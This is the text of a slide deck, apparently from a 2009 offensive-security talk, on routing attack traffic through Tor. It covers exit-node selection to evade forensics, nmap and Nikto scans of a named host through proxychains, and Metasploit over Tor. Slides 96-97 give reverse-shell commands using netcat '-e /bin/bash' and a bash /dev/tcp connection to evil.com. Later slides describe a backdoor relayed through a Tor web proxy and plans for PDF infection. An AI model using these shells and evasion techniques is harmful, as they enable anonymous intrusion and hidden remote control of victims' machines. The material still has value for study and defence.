Slide: 75
Button, button, who's got the button
 When using tor, normally the exit node is random
 It is possible to define an exit node, or group of exit 
nodes
 Nice for viewing content that is blocked by country
 Way to cover tracks
 Easy to hide in the evil that is tor
 Avoid using an exit node in the target country when 
possible
− Target country can collect node for forensics
Slide: 76
Where am I again?
 Theoretically you can just specify a country 
code in the tor_rc file. 
 Never seen it work correctly
 Documented not to work in many news groups
 Nice to pop out of just one or two nodes if 
running scans and such
 Easy to change, can even have many configs 
with different exit nodes, and periodically 
change
Slide: 77
Who's who
 Vidalia is an easy way to manage tor, here 
we are looking at potential tor exit nodes
Slide: 78
Who's who
 Selecting Nodes Through Vidalia
 When selecting exit nodes, it is important to 
make sure they have somewhat unique names
− Unnamed is a common node name, it should be 
avoided
 Now create a new file that will be the tor config
− Add the following lines
ExitNodes list,of,nodes
StrictExitNodes 1
Slide: 79
Who's who
 There are also webpages that will provide tor nodes
 https://torstatus.blutmagie.de/
 Here it is possible to click on a node, and retrieve a 
finger print
− Add a dollar to the front, and get rid of the spaces. Then these 
can be used as tor exit nodes
 Unnamed: 46D0 5072 0DE9 D59E 6C22 D970 453B E287 C03F 
CE9B 
 $46D050720DE9D59E6C22D970453BE287C03FCE9B 
→
− All these nodes may not be active at any given time, so grab a 
lot
− Now unnamed will work great, names do not matter
Slide: 80
https://torstatus.blutmagie.de/
Slide: 81
Who's who
 In Vidalia, you must point at the new config 
file
 Stop TOR
 Open settings
− Advanced
− And point to the new config file
Slide: 82
What do I have?
 Privoxy
 HTTP Proxy on port 8118 (by default)
 Cleans/denies pages that may unintentionally reveal 
private IP when viewed in browser
 Commonly configured to talk to tor's socks proxy
 TOR
 Full socks 5 proxy on port 9050
 Vidalia 
 Gui interface to control tor
Slide: 83
It'll fit
 As it turns out, with a bit of creative patchwork, just 
about any TCP connection can go over tor
 There are a couple major programs in Linux that can really 
make TOR useful
− Proxychains
­ torsocks
− Tsocks
 These programs are designed to hook the socket calls of a 
program, and send them over the proxy
 When using these, always use IP, DNS can potentially leak
 Never run as root, root has higher privilege
 If one fails, try the other
Slide: 84
I want to proxy
 Setting up proxychains
 In /etc/proxychains.conf
− Comment out random_chain, chain_len, and example proxies
− Uncomment or add dynamic_chain
− At the bottom add a socks 5 proxy for TOR
 socks5  127.0.0.1 9050
− Depending on path and target, the following values will need 
to be messed with
 tcp_read_time_out
 tcp_connect_time_out
 The bigger these are the more likely they will get the right port, 
but they may run into other problems, like slow scans, or more 
false positive scans
Slide: 85
I want to proxy
 Setting up tsocks
 In /etc/tsocks make sure the following lines are 
correct
− Server = 127.0.0.1
# TOR host, usually local
− server_type = 5
# Socks4/5, usually 5
− server_port = 9050
# tor port, default 9050
Slide: 86
I want to proxy
•
Torsocks 
–
Basically set up for you when built from 
source
–
TOR friendly replacement for tsocks
Slide: 87
Lets give'r a go
 Lets try nmap over tor
 Timeouts become problematic
 Different exit nodes have different policies, and may 
stop parts of the scan
 The results are less than accurate, but provide a good 
place to start
 Requires a lot of time, and a lot of tweaking, but better 
than flying to another country (sometimes)
 Do not run UDP, name lookup, ping, or any scans 
requiring root
Slide: 88
Lets give'r a go
user@user­laptop:~/tor_rc$ proxychains nmap ­n ­PN ­p 80,22,443 192.1.167.74
Starting Nmap 4.76 ( http://nmap.org ) at 2009­05­25 09:41 MDT
ProxyChains­2.1 (http://proxychains.sf.net)
dynamic chain:....127.0.0.1:9050....access denied to..192.1.167.74:443
dynamic chain:....127.0.0.1:9050....access denied to..192.1.167.74:443
…
user@user­laptop:~/tor_rc$ proxychains nmap ­n ­A ­PN ­p 80,22 192.1.167.74
Starting Nmap 4.76 ( http://nmap.org ) at 2009­05­25 09:42 MDT
ProxyChains­2.1 (http://proxychains.sf.net)
dynamic chain:....127.0.0.1:9050....192.1.167.74:22..OK
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
dynamic chain:....127.0.0.1:9050....192.1.167.74:22..OK
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd
Service Info: OS: Linux
Slide: 89
Lets give'r a go
Slide: 90
Lets get a bit deeper
 Here will run Nikto over tor. 
 Nikto has a proxy option
− This is a full HTTP proxy, not socks
− This can be used with Privoxy
− Privoxy will end up messing with results, making it 
less than useful
 Instead running Nikto over tsocks works much 
better
Slide: 91
Lets get a bit deeper
user@user­laptop:~/$ proxychains nikto ­host blog.attackresearch.com 192.1.167.74
­ Nikto v2.03/2.04
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
ProxyChains­2.1 (http://proxychains.sf.net)
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
+ Target IP:          192.1.167.74
+ Target Hostname:    blog.attackresearch.com
+ Target Port:        80
+ Start Time:         2009­05­26 10:12:46
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
+ Server: Apache
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
...
­ /robots.txt ­ contains 40 'disallow' entries which should be manually viewed. (GET)
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
+ OSVDB­0: Retrieved X­Powered­By header: PHP/5.2.4­2ubuntu5.4
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
+ OSVDB­0: ETag header found on server, inode: 131801, size: 1820, mtime: 0x462ed49df8840
...
+ 3577 items checked: 32 item(s) reported on remote host
+ End Time:        2009­05­26 15:07:00 (17654 seconds)
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
+ 1 host(s) tested
Test Options: ­host blog.attackresearch.com 192.1.167.74
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
Slide: 92
What the heck, I'll eat the whole cow
 Lets say there is a VPN at a remote site. It is a 
TCP based VPN like PPTP
 With some creative combinations of port redirection, 
and tsock/proxychains we can VPN over TOR
− This will not be very reliable
− Timeout can kill the connection
 Using tcpxd on one host we can setup 
− tsocks tcpxd 1723 ip.of.target 1723
− Now have a second machine PPTP into the first
Slide: 93
Metasploit and TOR
•
A couple of possibilities
–
Use Torsocks
–
Easier to do it in metssploit
•
setg Proxies SOCKS4:localhost:
–
Both methods are restricted to Connect 
Shells
–
Both are restricted to TCP
–
Always try and use IP to avoid 
unintended leakage
Slide: 94
Demo
Slide: 95
Can they call me anonymously?
 Sure, TOR uses .onion domains in order to 
talk to anonymous servers on the TOR 
network
 Normally requires TOR on both sides
 Can we shell to a .onion?
− Sure, through tsocks, privoxy, or even wget
 Can you tell what country a .onion is in?
− Currently no, there have been problems found in 
TOR in the past, but they are fairly quick to patch
Slide: 96
Shelling Bash Over TOR
• TOR is installed on target with torsocks
– Simplest case, a netcat listener, and using 
built in bash commands
– Setting up the server
•
In the torrc file, add the following lines
–
HiddenServiceDir /my/service/dir/
–
HiddenServicePort  127.0.0.1:
•
Now star netcat on 
–
nc ­l  ­p 
Slide: 97
Shelling Bash Over TOR
•
Now on the target
–
With Netcat
•
torsocks nc ­e /bin/bash  
–
 is in the servers service dir 
in a file called hostname
–
Without Netcat
•
torsocks /bin/bash
•
exec 5<>/dev/tcp/evil.com/8080
•
cat &5 >&5; done
Slide: 98
Do I have to install TOR on the target?
 Turns out no.
 There are web proxy's that give access into the TOR 
network
− www.tor­proxy.net Is one of many sites that lets a user 
bounce through them and then into TOR.
 Keep in mind, unfortunately they see all traffic, they won't know 
where the server is though
 http://tor­proxy.net/proxy/tor/browse.php?u=http%3A%2F
%2Fslashdot.org%2F&b=14
− We have created Proof­of­Concept shells using this method
− Basically a modified HTTP/HTTPS Shell
Slide: 99
The tor­proxy.net Backdoor
•
Benefits
–
No need for to on the client
–
Can't tell who the server belongs to
–
Can do https
•
Downfalls
–
tor­proxy.net can read all the traffic
–
Asynchronous, it can take a bit before 
command output
–
Not interactive
Slide: 100
DEMO
Slide: 101
To Do (working on it)
• Metasploit module that automatically 
generates the web apps / web server
– Autogen’s the applet & meterpreter
– Integrate with PDF infector module
– Integrate post­exploit automation scripts
– Integrate with browser autopwn
• 2nd stage HTTP Backdoor
• More integration with TOR
Slide: 102
PhishTunnel
• Demo everything over TOR
– TOR backdoor communications
– Metasploit over TOR
– Metaphish concepts over TOR
Slide: 103
Thanks!
• #AR
HD Moore
• Rezen                                         
 Dean De Beers
• Cg
Delchi
• Snowchyld
egypt
• Ed Skoudis
tebo
• !lso
carnal0wnage
• Dragorn
Anyone we forgot
• Knicklighter
famousjs
• Check out autopwn, egypt & Efrain Torres talks for 
awesome web p0wnage concepts and tools